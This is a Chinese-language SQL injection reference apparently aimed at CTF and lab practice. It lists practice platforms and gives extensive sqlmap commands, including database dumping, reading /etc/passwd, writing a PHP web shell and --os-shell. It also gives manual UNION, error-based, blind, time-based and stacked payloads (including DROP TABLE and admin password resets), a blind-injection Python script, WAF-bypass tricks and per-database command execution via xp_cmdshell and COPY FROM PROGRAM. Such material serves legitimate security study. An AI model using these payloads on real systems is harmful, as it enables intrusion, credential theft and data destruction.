# SQL注入工具

SQL注入是Web安全中最常见的漏洞之一。

## 在线工具

### SQL注入学习平台

| 工具名称 | 链接 | 特点 |
|---------|------|------|
| SQLMap Online | [http://www.sqlilab.com/](http://www.sqlilab.com/) | 在线练习平台 |
| DVWA | 多个在线实例 | SQL注入练习 |
| HackTheBox | [https://www.hackthebox.com/](https://www.hackthebox.com/) | CTF靶场 |

### SQL注入速查表

| 资源名称 | 链接 | 特点 |
|---------|------|------|
| SQL Injection Wiki | [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com/) | 各数据库注入语法、Payload收集 |
| PortSwigger Cheat Sheet | [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) | Burp官方，详细注入语法 |
| PayloadsAllTheThings | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) | SQL注入Payload大全 |

### 在线SQL测试

| 工具名称 | 链接 | 功能 |
|---------|------|------|
| SQL Fiddle | [http://sqlfiddle.com/](http://sqlfiddle.com/) | 在线SQL测试 |
| DB Fiddle | [https://www.db-fiddle.com/](https://www.db-fiddle.com/) | 多数据库支持 |

## 离线工具

### SQLMap

**下载链接**:
```
https://github.com/sqlmapproject/sqlmap
```

**安装**:
```bash
# 方法1: pip安装
pip install sqlmap

# 方法2: Git克隆
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py

# 方法3: Kali Linux预装
sqlmap -h
```

**基本使用**:
```bash
# 基础扫描
sqlmap -u "http://example.com/page?id=1"

# 指定POST数据
sqlmap -u "http://example.com/login" --data="username=admin&password=123"

# 从Burp请求文件
sqlmap -r request.txt

# Cookie注入
sqlmap -u "http://example.com/" --cookie="id=1*"

# HTTP头注入
sqlmap -u "http://example.com/" --headers="X-Forwarded-For: 1*"

# 列出数据库
sqlmap -u "url" --dbs

# 列出当前数据库的表
sqlmap -u "url" --current-db --tables

# 列出指定数据库的表
sqlmap -u "url" -D database_name --tables

# 列出表的列
sqlmap -u "url" -D database_name -T table_name --columns

# 导出数据
sqlmap -u "url" -D database_name -T table_name --dump

# 导出指定列
sqlmap -u "url" -D database_name -T table_name -C "username,password" --dump

# 搜索列名
sqlmap -u "url" --search -C password

# 搜索表名
sqlmap -u "url" --search -T users
```

**高级选项**:
```bash
# 指定数据库类型
sqlmap -u "url" --dbms=mysql

# 指定注入技术
sqlmap -u "url" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind

# 指定风险等级和测试级别
sqlmap -u "url" --level=5 --risk=3
# level: 1-5 (检测深度)
# risk: 1-3 (风险级别)

# 使用代理
sqlmap -u "url" --proxy="http://127.0.0.1:8080"

# 随机User-Agent
sqlmap -u "url" --random-agent

# 延迟请求
sqlmap -u "url" --delay=2

# 指定线程
sqlmap -u "url" --threads=10

# 批量模式（不需要用户交互）
sqlmap -u "url" --batch

# 绕过WAF
sqlmap -u "url" --tamper=space2comment

# 常用tamper脚本
--tamper=space2comment        # 空格替换为注释
--tamper=charencode          # URL编码
--tamper=between             # 替换大于号
--tamper=randomcase          # 随机大小写
--tamper=equaltolike         # = 替换为 LIKE

# 读取文件
sqlmap -u "url" --file-read="/etc/passwd"

# 写入文件
sqlmap -u "url" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 执行系统命令
sqlmap -u "url" --os-shell

# 获取数据库用户权限
sqlmap -u "url" --privileges

# 获取当前用户
sqlmap -u "url" --current-user

# 枚举用户
sqlmap -u "url" --users

# 枚举密码哈希
sqlmap -u "url" --passwords
```

**从Burp Suite导出请求**:
```bash
# 1. Burp中右键请求 -> Copy to file -> 保存为request.txt
# 2. 使用SQLMap
sqlmap -r request.txt --batch --dbs

# 如果需要修改某个参数
sqlmap -r request.txt -p id --batch
```

### SQLi-Labs练习靶场

**下载链接**:
```
https://github.com/Audi-1/sqli-labs
```

**安装**:
```bash
# 使用Docker（推荐）
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 80:80 acgpiano/sqli-labs

# 手动安装
git clone https://github.com/Audi-1/sqli-labs.git
# 配置Apache + PHP + MySQL
# 访问 http://localhost/sqli-labs/
```

**特点**:
- 75个关卡
- 覆盖各种注入类型
- 从简单到复杂
- 包含GET/POST/Cookie/Header注入

### NoSQLMap

**下载链接**:
```
https://github.com/codingo/NoSQLMap
```

**安装使用**:
```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
python nosqlmap.py

# NoSQL注入测试（MongoDB等）
```

## SQL注入类型详解

### 1. 联合查询注入 (UNION-based)

**原理**: 使用UNION合并查询结果

**完整步骤**:
```sql
-- Step 1: 判断注入点
?id=1'         # 报错 → 存在注入
?id=1' --      # 正常 → 字符型注入
?id=1 AND 1=1  # 正常 → 数字型注入

-- Step 2: 判断列数
?id=1' ORDER BY 1--   # 正常
?id=1' ORDER BY 2--   # 正常
?id=1' ORDER BY 3--   # 正常
?id=1' ORDER BY 4--   # 报错 → 3列

-- Step 3: 查看回显位置
?id=-1' UNION SELECT 1,2,3--
# 页面显示 2 和 3 → 这两个位置可以用来显示数据

-- Step 4: 获取数据库信息
?id=-1' UNION SELECT 1,database(),version()--
?id=-1' UNION SELECT 1,user(),@@datadir--

-- Step 5: 获取表名
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- Step 6: 获取列名
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--

-- Step 7: 获取数据
?id=-1' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

### 2. 报错注入 (Error-based)

**原理**: 通过错误信息获取数据

**常用函数**:
```sql
-- updatexml (MySQL)
?id=1' AND updatexml(1,concat(0x7e,database(),0x7e),0)--
?id=1' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),0)--

-- extractvalue (MySQL)
?id=1' AND extractvalue(1,concat(0x7e,database()))--
?id=1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--

-- floor (MySQL)
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--

-- exp (MySQL 5.5+)
?id=1' AND exp(~(SELECT * FROM (SELECT database())a))--

-- geometrycollection
?id=1' AND geometrycollection((SELECT * FROM(SELECT database())a))--

-- multipoint
?id=1' AND multipoint((SELECT * FROM(SELECT database())a))--
```

### 3. 布尔盲注 (Boolean-based blind)

**原理**: 根据页面响应差异判断真假

**手工注入**:
```sql
-- 判断注入点
?id=1' AND 1=1--   # 正常页面 → True
?id=1' AND 1=2--   # 异常页面 → False

-- 判断数据库名长度
?id=1' AND length(database())>5--   # True/False

-- 逐字符猜解数据库名
?id=1' AND ASCII(SUBSTRING(database(),1,1))>97--
?id=1' AND ASCII(SUBSTRING(database(),1,1))>109--
?id=1' AND ASCII(SUBSTRING(database(),1,1))=115-- # 's'

-- 判断表数量
?id=1' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5--

-- 猜解表名
?id=1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=117-- # 'u'
```

**Python脚本示例**:
```python
import requests
import string

url = "http://example.com/page?id=1"
result = ""

# 猜解数据库名
for i in range(1, 20):
    for char in string.printable:
        payload = f"' AND ASCII(SUBSTRING(database(),{i},1))={ord(char)}--"
        r = requests.get(url + payload)
        
        if "expected_content" in r.text:  # 根据正常页面特征判断
            result += char
            print(f"Found: {result}")
            break
    else:
        break  # 没找到字符，结束

print(f"Database: {result}")
```

### 4. 时间盲注 (Time-based blind)

**原理**: 使用延时函数判断条件真假

**MySQL**:
```sql
-- 基本延时
?id=1' AND SLEEP(5)--

-- 条件延时
?id=1' AND IF(1=1,SLEEP(5),0)--
?id=1' AND IF(LENGTH(database())>5,SLEEP(5),0)--

-- 逐字符猜解
?id=1' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--

-- BENCHMARK函数（计算密集型延时）
?id=1' AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--
```

**PostgreSQL**:
```sql
?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
?id=1'; SELECT CASE WHEN (LENGTH(current_database())>5) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**SQL Server**:
```sql
?id=1'; IF (1=1) WAITFOR DELAY '0:0:5'--
?id=1'; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:5'--
```

**Oracle**:
```sql
?id=1' AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END--
```

### 5. 堆叠注入 (Stacked queries)

**原理**: 执行多条SQL语句（需数据库支持）

**支持的数据库**: SQL Server, PostgreSQL, MySQL (部分情况)

**示例**:
```sql
-- 创建表
?id=1'; CREATE TABLE temp(data varchar(100))--

-- 插入数据
?id=1'; INSERT INTO temp VALUES('test')--

-- 更新数据
?id=1'; UPDATE users SET password='123456' WHERE username='admin'--

-- 删除数据
?id=1'; DELETE FROM logs--

-- 删除表（危险！）
?id=1'; DROP TABLE users--
```

## 绕过技巧

### 空格绕过

```sql
-- 使用注释
/**/  
SELECT/**/username/**/FROM/**/users

-- MySQL内联注释
/*!SELECT*/username/*!FROM*/users

-- Tab、换行等空白字符
%09 (Tab)
%0a (换行\n)
%0b (垂直制表符)
%0c (换页\f)
%0d (回车\r)
%a0 (非断空格)

-- 括号
(SELECT(username)FROM(users))

-- 加号（仅URL中）
SELECT+username+FROM+users
```

### 关键字绕过

```sql
-- 大小写混合
SeLeCt UsErNaMe FrOm UsErS

-- 双写（过滤一次的情况）
SELSELECTECT
UNUNIONION
ANANDD

-- 编码
%53%45%4c%45%43%54  # SELECT的URL编码
%u0053%u0045%u004c%u0045%u0043%u0054  # Unicode编码

-- 内联注释
/*!50000SELECT*/ /*!50000username*/ /*!50000FROM*/ /*!50000users*/

-- 等价替换
AND → &&
OR → ||
= → LIKE
> → NOT BETWEEN 0 AND x

-- 函数拆分
SUBSTRING → SUBSTR → MID
ASCII → ORD
CONCAT → CONCAT_WS
```

### 引号绕过

```sql
-- 十六进制编码
SELECT * FROM users WHERE username=0x61646d696e
# 0x61646d696e = 'admin'

-- CHAR函数
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
# CHAR(97,100,109,105,110) = 'admin'

-- 反斜杠转义（部分情况）
SELECT * FROM users WHERE username=\'admin\'
```

### 逗号绕过

```sql
-- UNION SELECT绕过
UNION SELECT 1,2,3
# 改为
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- LIMIT绕过
LIMIT 0,1
# 改为
LIMIT 1 OFFSET 0

-- SUBSTRING绕过
SUBSTRING(str,1,1)
# 改为
SUBSTRING(str FROM 1 FOR 1)
MID(str FROM 1 FOR 1)
```

### 比较符号绕过

```sql
-- 不使用等号
= → LIKE
= → REGEXP
= → IN

-- 不使用大于小于号
> → NOT BETWEEN 0 AND x
< → BETWEEN x AND 999999
```

### WAF绕过

```sql
-- HTTP参数污染
?id=1&id=2 UNION SELECT...

-- 缓冲区溢出
?id=1 AND 1=1--[大量垃圾字符]

-- 编码混合
?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54

-- 分块传输
Transfer-Encoding: chunked

-- 大小写混淆
uNiOn SeLeCt

-- 注释混淆
/*!12345UNION*//*!12345SELECT*/
```

## 不同数据库特性

### MySQL

```sql
-- 版本信息
SELECT @@version
SELECT VERSION()

-- 当前数据库
SELECT database()
SELECT schema()

-- 当前用户
SELECT user()
SELECT current_user()
SELECT system_user()

-- 数据库路径
SELECT @@datadir

-- 读文件（需要FILE权限）
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE(0x2f6574632f706173737764)  # 十六进制绕过引号

-- 写文件（需要FILE权限）
SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT '<?php phpinfo();?>' INTO DUMPFILE '/var/www/html/info.php'

-- information_schema查询
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 字符串拼接
CONCAT('a','b','c')
CONCAT_WS(',','a','b','c')
GROUP_CONCAT(column_name)

-- 延时
SLEEP(5)
BENCHMARK(5000000,MD5('a'))

-- 条件语句
IF(condition, true, false)
CASE WHEN condition THEN true ELSE false END
```

### PostgreSQL

```sql
-- 版本
SELECT version()

-- 当前数据库
SELECT current_database()

-- 当前用户
SELECT current_user
SELECT user

-- 列出数据库
SELECT datname FROM pg_database

-- 列出表
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- 列出列
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 读文件
SELECT pg_read_file('/etc/passwd')
COPY (SELECT '') TO '/tmp/out.txt'

-- 命令执行
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;

-- 延时
SELECT pg_sleep(5)

-- 字符串拼接
'string1' || 'string2'
```

### SQL Server (MSSQL)

```sql
-- 版本
SELECT @@version

-- 当前数据库
SELECT DB_NAME()

-- 当前用户
SELECT SYSTEM_USER
SELECT USER_NAME()

-- 列出数据库
SELECT name FROM master..sysdatabases
SELECT name FROM sys.databases

-- 列出表
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM sys.tables

-- 列出列
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

-- 读文件
BULK INSERT temp FROM 'C:\file.txt'

-- 命令执行（需要特权）
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'

-- 延时
WAITFOR DELAY '0:0:5'

-- 字符串拼接
'string1'+'string2'
CONCAT('string1','string2')

-- 注释
-- 单行注释
/* 多行注释 */
```

### Oracle

```sql
-- 版本
SELECT banner FROM v$version
SELECT version FROM v$instance

-- 当前数据库
SELECT ora_database_name FROM dual
SELECT name FROM v$database

-- 当前用户
SELECT user FROM dual

-- 列出表
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables

-- 列出列
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- 字符串拼接
'string1' || 'string2'
CONCAT('string1','string2')

-- 延时
DBMS_LOCK.SLEEP(5)

-- 条件语句
CASE WHEN condition THEN value1 ELSE value2 END

-- 注意: Oracle的SELECT必须有FROM
SELECT 1 FROM dual
```

## CTF解题技巧

!!! tip "快速判断注入点"
    ```
    1. 单引号测试
       ?id=1'        → 报错
       ?id=1''       → 正常
       → 存在SQL注入
    
    2. 数字型判断
       ?id=1 AND 1=1  → 正常
       ?id=1 AND 1=2  → 异常
       → 数字型注入
    
    3. 字符型判断
       ?id=1' AND '1'='1  → 正常
       ?id=1' AND '1'='2  → 异常
       → 字符型注入
    
    4. 时间盲注判断
       ?id=1' AND SLEEP(5)--  → 延迟5秒
       → 时间盲注
    ```

!!! tip "SQLMap快速使用"
    ```bash
    # 最基础
    sqlmap -u "http://target.com/?id=1"
    
    # 从Burp导入
    sqlmap -r request.txt --batch
    
    # 指定数据库类型（更快）
    sqlmap -u "url" --dbms=mysql --batch
    
    # 直接获取所有数据库
    sqlmap -u "url" --dbs --batch
    
    # 一条命令dump整个数据库
    sqlmap -u "url" -D dbname --dump-all --batch
    
    # 搜索敏感列（flag/password等）
    sqlmap -u "url" --search -C flag,password
    ```

!!! tip "信息收集顺序"
    ```
    1. 数据库类型 → @@version / version()
    2. 当前数据库 → database()
    3. 所有表名 → information_schema.tables
    4. 关注的表的列名 → information_schema.columns
    5. 导出数据 → SELECT * FROM table
    ```

!!! tip "绕过WAF"
    ```sql
    -- 组合多种技巧
    ?id=1'/**/UNunionION/**/SEselectLECT/**/1,2,database()--
    
    -- 使用SQLMap tamper
    sqlmap -u "url" --tamper=space2comment,randomcase
    
    -- 常用tamper组合
    --tamper=space2comment,between,randomcase
    ```

!!! warning "常见问题"
    - **URL编码**: 注意`#`在URL中需要编码为`%23`
    - **注释符号**: MySQL用`--空格`或`#`，MSSQL用`--`
    - **权限问题**: 读写文件需要FILE权限
    - **单引号转义**: 某些WAF会转义单引号，尝试宽字节注入
    - **SQLMap卡住**: 使用`--batch`跳过交互，`--threads=10`加速

!!! tip "快速Payload"
    ```sql
    # 万能密码
    admin' OR '1'='1
    admin' OR 1=1#
    ' OR 1=1--
    
    # UNION注入（3列）
    -1' UNION SELECT 1,2,3--
    -1' UNION SELECT 1,database(),version()--
    -1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
    
    # 报错注入
    ' AND updatexml(1,concat(0x7e,database()),0)--
    ' AND extractvalue(1,concat(0x7e,database()))--
    
    # 时间盲注
    ' AND IF(1=1,SLEEP(5),0)--
    ' AND IF(LENGTH(database())>5,SLEEP(5),0)--
    ```

## 相关资源

- **SQLMap**: 必备自动化工具，功能强大
- **SQLi-Labs**: 最佳SQL注入学习靶场
- **PayloadsAllTheThings**: Payload大全
- **SQL Injection Wiki**: 各数据库注入语法速查
- **PortSwigger Cheat Sheet**: 官方权威参考
